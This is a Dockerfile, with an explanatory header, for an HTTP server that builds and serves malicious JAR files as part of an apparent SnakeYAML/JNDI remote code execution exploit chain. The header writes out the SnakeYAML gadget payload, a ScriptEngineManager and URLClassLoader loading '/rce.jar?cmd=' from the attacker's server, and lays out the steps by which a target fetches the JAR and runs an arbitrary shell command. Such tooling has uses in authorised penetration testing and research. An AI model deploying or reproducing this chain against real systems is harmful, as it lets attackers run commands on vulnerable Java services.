# ── SPI JAR HTTP server for SnakeYAML RCE exploit ────────────────────────────
# Chain: jchains_jndi_snakeyaml
#
# This server dynamically generates a JAR file containing a ScriptEngineFactory
# SPI implementation (RceFactory) that executes an arbitrary shell command when
# instantiated by ScriptEngineManager.
#
# SnakeYAML SPI gadget chain:
#   !!javax.script.ScriptEngineManager [
#     !!java.net.URLClassLoader [[
#       !!java.net.URL ["http://THIS_SERVER:8099/rce.jar?cmd=ENCODED_CMD"]
#     ]]
#   ]
#
# The JAR is generated on-the-fly per request — no pre-compilation required.
# The bytecode is crafted in pure Python (build_jar.py) without javac.
#
# Usage with jchains_jndi_snakeyaml:
#   1. OOBserver JNDI server returns SnakeyamlRef pointing to this server
#   2. Target's JNDI lookup resolves the ref, parses the YAML
#   3. URLClassLoader fetches /rce.jar?cmd=<cmd> from this server
#   4. ScriptEngineManager SPI loads RceFactory, constructor executes cmd
# ─────────────────────────────────────────────────────────────────────────────

FROM python:3.11-alpine

# curl for health checks; no other build deps needed (bytecode generated in Python)
RUN apk add --no-cache curl

WORKDIR /app
COPY build_jar.py .
COPY server.py .

EXPOSE 8099
ENV PORT=8099

HEALTHCHECK --interval=15s --timeout=5s --start-period=10s --retries=3 \
    CMD curl -sf http://localhost:${PORT}/health || exit 1

CMD ["python3", "server.py"]
